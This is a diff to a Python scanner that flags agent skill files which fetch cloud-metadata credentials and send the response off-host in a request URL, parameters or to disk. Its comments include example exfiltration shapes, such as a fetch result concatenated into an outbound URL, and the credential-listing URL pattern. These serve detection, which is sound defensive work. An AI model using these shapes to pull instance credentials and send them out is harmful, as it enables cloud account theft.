+# on B-1011 -- attribute masking, a statement-tail match, curl flag/span parsing --
+# was broken by an automated review round (decoys in comments or second commands,
+# writes into the response object, aliasing, chained reads). Same class as a length
+# or expiry derived from the response: any value derived from a metadata response in
+# an off-host URL is a FAIL, the fail-closed direction. A sound split would need real
+# data-flow (and, for curl, `curlargv.py`), not another heuristic.
+
+
+# A plain string literal -- quoted, no prefix letter, nothing that could interpolate
+# (`$`, `{`) -- carries no variable's VALUE, so a tainted name spelled inside one
+# (`params={"role": "admin"}`, `"/" + "data/list"`) is not the name being sent
+# (C-135 round 4 on B-1011). A scanner, not a regex: every literal -- prefixed
+# (`f"..."`, `rb'...'`), triple-quoted or backtick -- is consumed as one unit, so its
+# closing quote can never pair with the next literal's opening one and blank the code
+# between them. Only unprefixed, non-interpolating literals are blanked; an
+# unbalanced quote leaves the text untouched (fail-closed).
+# A literal is blanked only when it sits where an expression operand can: after an
+# operator/opening bracket/start, and before an operator/closing bracket/separator/end.
+# A quote that does not (a shell apostrophe, a regex literal) leaves the span as is.
+_B339_LITERAL_OPENERS = frozenset(["", "(", "[", "{", ",", "=", ":", "+", "%", "?"])
+_B339_LITERAL_CLOSERS = frozenset(["", ")", "]", "}", ",", ":", "+", "%", ";", "."])
+# ...and only when its body is ONE word/path token (`"role"`, `"admin"`,
+# `"role/list"`): no whitespace, operator, bracket, quote, escape or interpolation
+# marker. A blacklist of code characters was still steerable (stray regex-literal
+# quotes pairing across live code); a mis-paired span across code always contains
+# whitespace or an operator, so it is never blanked (fail-closed).
+_B339_INERT_BODY_RE = re.compile(r"[\w./:@-]*")
+
+
+def _b339_blank_plain_strings(text: str) -> str:
+    out = list(text)
+    n = len(text)
+    k = 0
+    while k < n:
+        ch = text[k]
+        if ch not in "\"'`":
+            k += 1
+            continue
+        prefixed = k > 0 and (text[k - 1].isalnum() or text[k - 1] == "_")
+        quote = ch * 3 if ch != "`" and text.startswith(ch * 3, k) else ch
+        j = k + len(quote)
+        while j < n:
+            if text[j] == "\\":
+                j += 2
+                continue
+            if text.startswith(quote, j):
+                break
+            if text[j] == "\n" and len(quote) == 1 and ch != "`":
+                return text
+            j += 1
+        else:
+            return text
+        body = text[k + len(quote) : j]
+        before = text[:k].rstrip()[-1:]
+        after = text[j + len(quote) :].lstrip()[:1]
+        delimited = before in _B339_LITERAL_OPENERS and after in _B339_LITERAL_CLOSERS
+        if ch != "`" and not prefixed and delimited and _B339_INERT_BODY_RE.fullmatch(body):
+            for m in range(k + len(quote), j):
+                if out[m] != "\n":
+                    out[m] = " "
+        k = j + len(quote)
+    return "".join(out)
+
+
+# A statement that is only a line comment is not code: `#` not followed by an
+# identifier character (a JS `#private` field is code), or `//` followed by
+# whitespace or the end (`//usr/bin/curl ...` is a real shell command path).
+_B339_LINE_COMMENT_RE = re.compile(r"\s*(?:#(?![\w$])|//(?=\s|\Z))")
+
+
+def _b339_credential_in_url(
+    norm: str,
+    match_end: int,
+    seed: str,
+    own_host,
+    seed_holds_url: bool = False,
+) -> "str | None":
+    """The off-host destination when the metadata response named *seed* (or a name
+    tainted from it) reaches an outbound call's URL within `_B339_QUERY_WINDOW`; None
+    otherwise. See the block comment above for the propagation rules.
+
+    Two name sets are kept apart: `url_names` hold the metadata URL itself, `tainted`
+    hold what was fetched with it. A URL name becomes a response only when it is passed
+    to a call (`_b339_fetches`); only `tainted` names are ever checked at a sink."""
+    window = norm[match_end : match_end + _B339_QUERY_WINDOW]
+    tainted: "set[str]" = set() if seed_holds_url else {seed}
+    url_names: "set[str]" = {seed} if seed_holds_url else set()
+    url_vars: "dict[str, str]" = {}
+
+    def classify(text: str) -> "str | None":
+        text = _b339_blank_plain_strings(text)
+        if tainted and _b339_names_re(tainted).search(text):
+            return "resp"
+        if url_names and _b339_fetches(text, url_names):
+            return "fetched"
+        if url_names and _b339_names_re(url_names).search(text):
+            return "url"
+        return None
+
+    offset = 0
+    for stmt in _B339_STMT_SPLIT_RE.split(window):
+        stmt_pos = match_end + offset
+        offset += len(stmt) + 1
+        if not stmt.strip() or _B339_LINE_COMMENT_RE.match(stmt):
+            continue
+        lm = _B339_LOOP_VAR_RE.search(stmt)
+        if lm is not None:
+            kind = classify(stmt[lm.end() :])
+            if kind in ("resp", "fetched"):
+                tainted.add(lm.group(1))
+            elif kind == "url":
+                url_names.add(lm.group(1))
+            # No discard when the loop rebinds a tainted name to untainted values: a
+            # loop may run zero times, so the old binding can survive it (fail-closed).
+        am = _B339_STMT_ASSIGN_RE.match(stmt)
+        if am is not None:
+            target, rhs = am.group(1), stmt[am.end() :]
+            kind = classify(rhs)
+            if kind == "fetched":
+                tainted.add(target)
+            elif kind == "resp":
+                sources = tainted - {target}
+                tainted.add(target)
+                for shape in _b339_url_shapes(sources):
+                    um = shape.search(rhs)
+                    if um is not None:
+                        dest = _b339_offhost_url(norm, stmt_pos, um.group(2), own_host)
+                        if dest is not None:
+                            url_vars[target] = dest
+                        break
+            elif kind == "url":
+                url_names.add(target)
+            elif not stmt[am.end() - 2 : am.end()] == "+=":
+                tainted.discard(target)
+                url_names.discard(target)
+                url_vars.pop(target, None)
+        for cm in _B339_COLLECT_RE.finditer(stmt):
+            kind = classify(stmt[cm.end() :])
+            if kind in ("resp", "fetched"):
+                tainted.add(cm.group(1))
+            elif kind == "url":
+                url_names.add(cm.group(1))
+        if not tainted and not url_names:
+            return None
+        names_re = _b339_names_re(tainted) if tainted else None
+        shapes = _b339_url_shapes(tainted) if tainted else ()
+        # A URL name fetched INLINE inside the URL being built
+        # (`get("http://x/?d=" + enc(await (await fetch(u)).text()))`) never passes
+        # through an assignment, so it is checked here: the URL shape must reach the
+        # name through a nested outbound call (`_b339_in_network_call`), never by the
+        # bare name -- that bare case is the URL itself, the round-1 FP.
+        url_shapes = _b339_url_shapes(url_names) if url_names else ()
+        sink_stmt = stmt
+        for call_m in _B339_URL_CALL_RE.finditer(sink_stmt):
+            seg = sink_stmt[call_m.end() : call_m.end() + _B339_URL_CALL_ARGS_WINDOW]
+            for idx, shape in enumerate(shapes):
+                for um in shape.finditer(seg):
+                    # Concat / `%` / `.format` shapes: the name must sit OUTSIDE a plain
+                    # string literal (template/f-string/shell shapes interpolate it).
+                    # The whole argument expression is checked (to its depth-0 `,`/`)`),
+                    # so a decoy literal before the real name cannot end the match early.
+                    tail_lo = um.end(2) + 1
+                    tail = seg[tail_lo : _b339_arg_end(seg, tail_lo, stop_at_comma=True)]
+                    if idx < 2 and names_re is not None and not names_re.search(
+                        _b339_blank_plain_strings(tail)
+                    ):
+                        continue
+                    dest = _b339_offhost_url(norm, stmt_pos, um.group(2), own_host)
+                    if dest is not None:
+                        return dest
+                    break
+            for shape in url_shapes:
+                for um in shape.finditer(seg):
+                    if _b339_in_network_call(seg[um.end(2) :], url_names):
+                        dest = _b339_offhost_url(norm, stmt_pos, um.group(2), own_host)
+                        if dest is not None:
+                            return dest
+            params_args = [_b339_params_arg(seg, pm.end()) for pm in _B339_PARAMS_KW_RE.finditer(seg)]
+            if any(
+                (names_re is not None and names_re.search(_b339_blank_plain_strings(a))) or _b339_in_network_call(a, url_names)
+                for a in params_args
+            ):
+                url_m = _EXFIL_URL_RE.search(seg)
+                if url_m is not None:
+                    dest = _b339_offhost_url(norm, stmt_pos, url_m.group(0), own_host)
+                    if dest is not None:
+                        return dest
+            fm = re.match(rf"\s*({_B339_VAR_NAME_RE})\b", seg)
+            if fm is not None and fm.group(1) in url_vars:
+                return url_vars[fm.group(1)]
+    return None
+
+
+def _b339_listing_followup(norm: str, match_start: int, match_end: int) -> bool:
+    """True when a bare-listing URL is used to BUILD the minting URL: the literal is
+    concatenated on the spot (`"...security-credentials/" + role`), or the name holding
+    it is later concatenated/interpolated (`LISTING + role`, `${LISTING}${role}`,
+    `"$LISTING$ROLE"`) within `_B339_QUERY_WINDOW`."""
+    if re.match(r"[\"'`]\s*\+", norm[match_end : match_end + 8]):
+        return True
+    v = _b339_response_variable(norm, match_start)
+    if v is None:
+        return False
+    window = norm[match_end : match_end + _B339_QUERY_WINDOW]
+    ve = re.escape(v)
+    return bool(
+        re.search(rf"\b{ve}\s*\+|\$\{{{ve}\}}\$|\{{{ve}\}}\{{|\$\{{?{ve}\}}?\$", window)
+    )
+
+
+def _b339_corroborated(
+    norm: str, match_start: int, match_end: int, own_host, network_only: bool = False
+) -> str | None:
     """The corroboration reason (a short label) when the credential URL match has
     real, nearby evidence of misuse -- the fetched credential VARIABLE flowing into
     an outbound call's payload, an instruction to disclose it through the agent's
@@ -14322,8 +15046,26 @@ def _b339_corroborated(norm: str, match_start: int, match_end: int, own_host) ->
                     host_m = _URL_HOST_RE.match(url)
                     host = host_m.group(1) if host_m is not None else url
                     return f"fetched credential forwarded to {host}"
-            if _b339_credential_persisted(disk_window, candidate):
+            if not network_only and _b339_credential_persisted(disk_window, candidate):
                 return "fetched credential persisted to disk"
+    # B-1011: the URL-query/path leg (block comment above
+    # `_B339_QUERY_WINDOW`) -- seeded more permissively than the legs above (inline
+    # push, open bracket literal), because the advisory shape keeps its URLs in an array.
+    seed = _b339_query_seed(norm, match_start)
+    if seed is not None:
+        dest = _b339_credential_in_url(
+            norm,
+            match_end,
+            seed,
+            own_host,
+            _b339_seed_holds_url(norm, match_start, seed),
+        )
+        if dest is not None:
+            host_m = _URL_HOST_RE.match(dest)
+            host = host_m.group(1) if host_m is not None else dest
+            return f"fetched metadata response sent to {host} inside the request URL"
+    if network_only:
+        return None
     disclose_window = norm[
         max(0, match_start - _B339_DISCLOSE_WINDOW) : match_end + _B339_DISCLOSE_WINDOW
     ]
@@ -14470,6 +15212,19 @@ def check_cloud_metadata_credential_fetch(ctx: Context) -> Finding:
                 fail_ev.append(f'{skill_name}: "{snippet}" ({reason})')
             elif not whole_doc_dampened:
                 warn_ev.append(f'{skill_name}: "{snippet}"')
+        # B-1011: the bare listing (see `_B339_LISTING_URL_RE`). Network
+        # legs only -- "show the user the role name" or caching it to disk is ordinary
+        # role detection, not a credential leak; sending the metadata response
+        # off-host is not.
+        for m in _B339_LISTING_URL_RE.finditer(norm):
+            if _b339_defensive_context(norm, m.start(), fr):
+                continue
+            snippet = _obf_clip(norm[max(0, m.start() - 10) : m.end() + 10], 100)
+            reason = _b339_corroborated(norm, m.start(), m.end(), own_host, network_only=True)
+            if reason is not None:
+                fail_ev.append(f'{skill_name}: "{snippet}" ({reason})')
+            elif not whole_doc_dampened and _b339_listing_followup(norm, m.start(), m.end()):
+                warn_ev.append(f'{skill_name}: "{snippet}" (role listing used to build the credential URL)')
 
     if fail_ev:
         ev_summary = "; ".join(fail_ev[:4])
